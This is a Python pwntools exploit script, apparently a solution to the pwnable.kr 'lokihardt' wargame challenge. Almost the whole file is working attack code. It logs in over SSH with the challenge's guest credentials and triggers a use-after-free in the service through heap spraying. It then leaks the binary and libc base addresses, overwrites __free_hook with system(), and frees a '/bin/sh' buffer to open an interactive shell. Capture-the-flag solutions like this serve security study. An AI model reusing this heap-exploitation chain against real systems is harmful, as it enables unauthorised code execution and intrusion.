from pwn import *


def select_menu(menu):
    p.recvuntil('> ')
    p.sendline(str(menu))


def alloc(idx):
    global ref_count
    select_menu(1)
    p.recvuntil('idx? ')
    p.sendline(str(idx))
    ref_count += 1


def delete(idx):
    global ref_count
    select_menu(2)
    p.recvuntil('idx? ')
    p.sendline(str(idx))
    ref_count -= 1


def use(idx):
    select_menu(3)
    p.recvuntil('idx? ')
    p.sendline(str(idx))


def gc():
    select_menu(4)


def spray():
    select_menu(5)


def send_nullstring(s):
    p.send(s + '\x00'*(16 - len(s)))


def alloc_fill(s, buf='\xff'):
    p.send(buf*256)
    send_nullstring(s)


def is_menu_str(s):
    return s == '- menu -'


class MyException(Exception):
    pass

'''
                   0x121            aaaaa...   g_buf      16  "null"
                |___size|B.............rdata|..wdata|.length|...type|
|___size|A.............rdata|..wdata|.length|...type|
'''

con = ssh(host='pwnable.kr', user='lokihardt', password='guest', port=2222)

final = False
while True:
    try:
        p = con.remote('localhost', 9027)

        ref_count = 0

        alloc(0)  # A
        alloc_fill('A')

        # free A
        delete(10)
        gc()

        alloc(1)  # B
        alloc_fill('write')

        # check offset
        use(0)
        if p.recvn(4) != 'your':
            raise MyException('Wrong Offset')

        p.success('Good Offset')

        # free B
        delete(10)
        gc()

        buf_count = 1

        # g_buf leak by heap spraying
        while True:
            spray()
            alloc_fill('read', chr(buf_count))
            buf_count += 1

            use(0)

            leak1_head = p.recvn(8)
            if is_menu_str(leak1_head):
                raise MyException('type was overwritten')

            leak1 = leak1_head + p.recvn(256 - 8)
            if leak1[0] != '\xff' and leak1[0] != '\xcc':
                break

        try:
            length_idx = leak1.index(p64(16))
        except ValueError:
            raise MyException('Will not handle this case')
        buf_length = 256 - length_idx - 24

        g_buf_addr = u64(leak1[length_idx-8:length_idx])
        g_buf_offset = 0x202040
        write_str_offset = 0x12bd
        binary_base = g_buf_addr - g_buf_offset

        p.success('Binary Base: {:#x}'.format(binary_base))

        # libc leak by freed chunk
        alloc(10)
        p.send(p64(g_buf_addr) * (256 / 8))
        send_nullstring('read')

        spray()
        alloc_fill('read')

        delete(10)
        gc()

        use(0)

        leak2_head = p.recvn(8)
        if is_menu_str(leak2_head):
            raise MyException('Too long padding')

        leak2 = leak2_head + p.recvn(256 - 8)
        try:
            fd_addr = u64(leak2[length_idx+24:length_idx+32])
        except ValueError:
            raise MyException('Will not handle this case')

        if fd_addr == 0:
            # fastbin
            idx = leak2.index(p64(0x121))
            buf_length = 256 - idx - 8
            try:
                fd_addr = u64(leak2[idx+8:idx+16])
            except ValueError:
                raise MyException('Leak failed...')
        p.success('FD Pointer Address: {:#x}'.format(fd_addr))

        # calculate libc base
        libc_base = (fd_addr & (~0xFFF)) - 0x3c3000
        system_offset = 0x45380
        system_addr = libc_base + system_offset
        free_hook_offset = 0x3c57a8
        free_hook_addr = libc_base + free_hook_offset

        p.success('libc base: {:#x}'.format(libc_base))
        final = True

        # overwrite free_hook
        spray()
        payload = 'Q'*buf_length + p64(free_hook_addr) + p64(8) + p64(binary_base + write_str_offset)
        p.send(payload + 'Q'*(256 - len(payload)))
        p.send('Q'*16)

        use(0)

        p.recvuntil('your data?')
        p.send(p64(system_addr))

        # free hook was overwitten!
        alloc(10)
        p.send('/bin/sh\x00' + 'Q'*(256 - 8))
        p.send('Q'*16)

        delete(10)
        gc()

        p.interactive()

        break
    except (MyException, EOFError) as e:
        log.failure(e)
        p.close()
        if final:
            break
        continue
